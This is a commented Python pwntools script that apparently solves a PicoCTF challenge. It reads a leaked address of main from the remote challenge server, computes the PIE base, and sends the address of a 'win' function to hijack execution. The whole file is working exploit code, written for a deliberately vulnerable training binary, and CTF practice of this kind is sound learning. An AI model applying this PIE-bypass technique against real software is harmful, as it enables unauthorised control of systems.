#!/usr/bin/python3
from pwn import *

# Requests the port that the script should connect to.
# In PicoCTF, the base address will generally remain the same after
# a reset, but the port will change.
port = int(input("Please enter the port to connect to: "))

# Reads in the vuln binary to provide context for the program
# elf files are essentially another name for executable files
# pwntools provides the capability to parse through executables using this ELF module.
elf = context.binary = ELF('./vuln')

# Connect to remote server
p = remote("rescued-float.picoctf.net", port)

# wait for the below text to appear
p.recvuntil(b'main: ')
# Read the next 16 characters (should capture the memory location it provides)
# the program provides us with the address of main.
main = int(p.recvline(), 16)

print("Server Main Location: %s" % hex(main))
print("Local Main Location: %s" % hex(elf.sym['main']))
print("Server Program Start: %s" % hex((main - elf.sym['main'])))

# Simulates the binary and grabs the memory location of main.
# Then updates the elf file to pretend like the memory start starts where the PIE
# one starts
elf.address = main - elf.sym['main']

print("Server Win Start: %s" % hex(elf.sym['win']))

# Converts the integer PIE address of the win function to hex
# Then sends it to the nc server.
p.sendline(hex(elf.sym['win']).encode())
# Prints the output!
print(p.clean().decode('latin-1'))
